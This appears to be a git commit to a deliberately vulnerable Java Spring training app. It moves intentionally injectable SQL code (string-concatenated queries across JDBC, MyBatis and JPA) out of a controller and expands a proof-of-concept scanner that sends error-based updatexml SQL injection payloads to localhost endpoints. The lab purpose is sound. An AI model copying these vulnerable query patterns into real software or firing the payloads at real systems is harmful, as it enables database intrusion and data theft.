91c56a55a3011de337acf1e3ac88630c7c8a9005
hjxin <hjxin@bestsec.cn>
2023-11-01 17:07:43 +0800

    update:新增sqli poc

--- src/main/java/cn/bestsec/vulweb/controller/SqliController.java
+++ src/main/java/cn/bestsec/vulweb/controller/SqliController.java
@@ -1,259 +1,109 @@
 package cn.bestsec.vulweb.controller;
-
-import cn.bestsec.vulweb.dao.BookDao;
-import cn.bestsec.vulweb.entity.User;
-import cn.bestsec.vulweb.entity.Book;
-import cn.bestsec.vulweb.mapper.UserMapper;
+import cn.bestsec.vulweb.service.SqliService;
 import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.jdbc.core.BeanPropertyRowMapper;
-import org.springframework.jdbc.core.JdbcTemplate;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
-
-import javax.persistence.EntityManager;
-import javax.persistence.PersistenceContext;
-import javax.persistence.Query;
 import java.sql.*;
-import java.util.Arrays;
 import java.util.List;
-import java.util.Map;
-import java.util.Optional;
 
 @RestController
 @RequestMapping("/sqli")
 public class SqliController {
 
     @Autowired
-    private JdbcTemplate jdbcTemplate;
-
-    @Autowired
-    private UserMapper userMapper;
-
-    @Autowired
-    private BookDao bookDao;
-
-    @PersistenceContext
-    private EntityManager entityManager;
-    private Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/demo", "root", "root");
+    private SqliService sqliService;
 
     public SqliController() throws SQLException {
     }
 
     @RequestMapping("/level1")
     public String level1(@RequestParam  String p){
-        /*
-          报错注入, JdbcTemplate.execute()
-         */
-        String sql = "select name from user where name='" + p + "'";
-        try{
-            jdbcTemplate.execute(sql);
-        }catch(Exception e){
-            return e.getMessage();
-        }
-
-        return "语句执行成功！！";
+        return sqliService.level1(p);
     }
 
     @RequestMapping("/level2")
     public List<?> level2(@RequestParam String p){
-        /*
-        报错注入，JdbcTemplate.query()
-         */
-        String sql = "select * from user where name='" + p + "'";
-        return jdbcTemplate.query(sql, new BeanPropertyRowMapper<>(User.class));
+        return sqliService.level2(p);
     }
 
     @RequestMapping("/level3")
     public String level3(@RequestParam String p){
-        String sql = "insert into user values('user2', '" + p + "')" ;
-        int row = jdbcTemplate.update(sql);
-        return "本次修改共影响" + row + "行";
+        return sqliService.level3(p);
     }
 
     @RequestMapping("/level4")
     public List<?> level4(@RequestParam String p){
-        String sql = "select * from user where name='" + p + "'";
-        List<Map<String, Object>> list = jdbcTemplate.queryForList(sql);
-        return list;
+        return sqliService.level4(p);
     }
 
     @RequestMapping("/level5")
     public String level5(@RequestParam String p){
-        String sql = "select * from user where name='" + p + "'";
-        Statement stmt = null;
-        try {
-            stmt = conn.createStatement();
-            stmt.execute(sql);
-        } catch (SQLException e) {
-            throw new RuntimeException(e);
-        }
-        return sql;
+        return sqliService.level5(p);
     }
 
     @RequestMapping("/level6")
     public String level6(@RequestParam String p){
-        String sql = "select * from user where name='" + p + "'";
-        Statement stmt;
-        try{
-            stmt = conn.createStatement();
-            stmt.executeQuery(sql);
-        }catch(Exception e){
-            throw new RuntimeException(e);
-        }
-        return sql;
+        return sqliService.level6(p);
     }
 
     @RequestMapping("level7")
     public String level7(@RequestParam String p){
-        String sql = "select * from user where name='" + p + "'";
-        try{
-            Statement stmt = conn.createStatement();
-            System.out.println(stmt.execute(sql, new int[]{0,1}));
-        }catch(Exception e){
-            throw new RuntimeException(e);
-        }
-        return sql;
+        return sqliService.level7(p);
     }
 
     @RequestMapping("/level8")
     public String level8(@RequestParam String p){
-        String sql = "select * from user where name='" + p + "'";
-        try{
-            Statement stmt = conn.createStatement();
-            System.out.println(stmt.execute(sql,new String[]{"name", "password"}));
-        }catch(Exception e){
-            throw new RuntimeException(e);
-        }
-        return sql;
+        return sqliService.level8(p);
     }
 
     @RequestMapping("/level9")
     public String level9(@RequestParam String p){
-        String sql = "select * from user where name='" + p + "'";
-        try{
-            Statement stmt = conn.createStatement();
-            System.out.println(stmt.execute(sql, Statement.NO_GENERATED_KEYS));
-        }catch(Exception e){
-            throw new RuntimeException(e);
-        }
-        return "level9:" + sql;
+        return sqliService.level9(p);
     }
 
     @RequestMapping("/level10")
     public String level10(@RequestParam String p){
-        String sql = "insert into user(name) values('" + p + "')";
-        String sql2 = "insert into  user(password) values('" + p + "')";
-        try{
-            Statement stmt = conn.createStatement();
-            stmt.addBatch(sql);
-            stmt.addBatch(sql2);
-            System.out.println(Arrays.toString(stmt.executeBatch()));
-        }catch(Exception e){
-            throw new RuntimeException(e);
-        }
-        return "level9:" + sql;
+        return sqliService.level10(p);
     }
 
     @RequestMapping("/level11")
     public String level11(@RequestParam String p){
-        String sql = "select name, password from user where name=? and password='" + p + "'";
-        try{
-            PreparedStatement stmt = conn.prepareStatement(sql);
-            stmt.setString(1, p);
-            stmt.execute();
-        }catch(Exception e){
-            throw new RuntimeException(e);
-        }
-        return sql;
+        return sqliService.level11(p);
     }
 
     @RequestMapping("/level12")
-
     public String level12(@RequestParam String p){
-        /*
-        mybatis无漏洞写法
-        */
-        User user = userMapper.queryUserByName(p);
-        if(user != null){
-            return user.toString();
-        }
-        return "用户找不到";
+        return sqliService.level12(p);
     }
 
     @RequestMapping("/level13")
     public String level13(String p){
-        /*
-        mybatis存在漏洞写法
-         */
-        User user = userMapper.queryUserByNameVul(p);
-        if(user != null){
-            return user.toString();
-        }
-        return "用户找不到";
+        return sqliService.level13(p);
     }
 
     @RequestMapping("/level14")
     public String level14(String p){
-        /*
-        mybatis存在漏洞
-         */
-        User user = userMapper.queryUserByNameVul2(p);
-        if(user != null){
-            return user.toString();
-        }
-        return "用户找不到";
+        return sqliService.level14(p);
     }
 
     @RequestMapping("/level15")
     public String level15(int p){
-        /*
-        spring data jpa不存在漏洞
-         */
-        Optional<Book> book = bookDao.findById(p);
-        return book.toString();
+        return sqliService.level15(p);
     }
 
     @RequestMapping("/level16")
     public String level16(String p){
-        /*
-        spring data jpa不存在漏洞
-         */
-        Book book = bookDao.getBookByBookName(p);
-        if(book != null){
-            return book.toString();
-        }
-        return "书籍未找到";
+        return sqliService.level16(p);
     }
 
     @RequestMapping("/level17")
     public String level17(String p){
-        /*
-        spring data jpa无漏洞
-         */
-        Book book = bookDao.getBookByName2(p);
-        if (book != null){
-            return book.toString();
-        }
-        return "书籍找不到";
+        return sqliService.level17(p);
     }
 
     @RequestMapping("/level18")
     public String level18(String p) {
-        /*
-        spring data jpa存在漏洞
-         */
-        String sql = "select b from Book b where b.authorName='" + p + "'";
-        System.out.println(sql);
-        Query query = entityManager.createQuery(sql);
-        Book book;
-        try {
-            book = (Book) query.getSingleResult();
-        } catch (Exception e) {
-            return e.getMessage();
-        }
-
-        return book.toString();
-
+        return sqliService.level18(p);
     }
 }
--- src/main/java/cn/bestsec/vulweb/poc/SqliPoc.java
+++ src/main/java/cn/bestsec/vulweb/poc/SqliPoc.java
@@ -1,29 +1,52 @@
 package cn.bestsec.vulweb.poc;
 
+import lombok.extern.slf4j.Slf4j;
 import okhttp3.*;
 
 import java.io.IOException;
+import java.util.ArrayList;
 
+
+@Slf4j
 public class SqliPoc {
     public static void main(String[] args) throws IOException {
-        level1();
+        String baseUrl = "http://localhost:8080/sqli/level%d?p=";
+        for(int i = 1;i<=18;i++){
+            String targetUrl = String.format(baseUrl, i);
+            System.out.println(isVul(targetUrl));
+        }
     }
 
-    public static void level1(){
-        String url = "http://localhost:8080/sqli/level1?p=' and updatexml(1,concat(0x7e,(select user())),1)%23";
-        OkHttpClient okHttpClient = new OkHttpClient();
-        Request request = new Request.Builder().url(url).get().build();
-        Call call = okHttpClient.newCall(request);
 
-        try (Response response = call.execute()) {
-            if(response.body() != null){
-                String body = response.body().string();
-                if(body.contains("root@") || body.contains("XPATH syntax error")){
-                    System.out.println("/sqli/level1接口存在sql注入漏洞！");
+    public static boolean isVul(String url){
+        ArrayList<String> payloadList = new ArrayList<>();
+        payloadList.add("' and updatexml(1,concat(0x7e,(select user())),1)%23");
+        payloadList.add("'),(updatexml(1,concat(0x7e,(select user())),1),1)%23");
+        payloadList.add("'),(updatexml(1,concat(0x7e,(select user())),1))%23");
+        payloadList.add("'");
+        OkHttpClient okHttpClient = new OkHttpClient();
+        boolean isVul = false;
+        isVul = payloadList.stream().anyMatch(payload -> {
+            String target = url + payload;
+            Request request = new Request.Builder().url(target).get().build();
+            Call call = okHttpClient.newCall(request);
+            try (Response response = call.execute()) {
+                if(response.body() != null){
+                    String body = response.body().string();
+                    if(body.contains("root@") || body.contains("XPATH syntax error") || body.contains("hibernate.QueryException")){
+                        return true;
+                    }
                 }
+            }catch (Exception e){
+                log.info("网络连接出错");
             }
-        }catch (Exception e){
-            System.out.println("连接出错");
+            return false;
+        });
+        if(isVul){
+            log.info(url + " 接口存在sql注入漏洞！");
+        }else{
+            log.info(url + " 接口无漏洞！");
         }
+        return isVul;
     }
 }
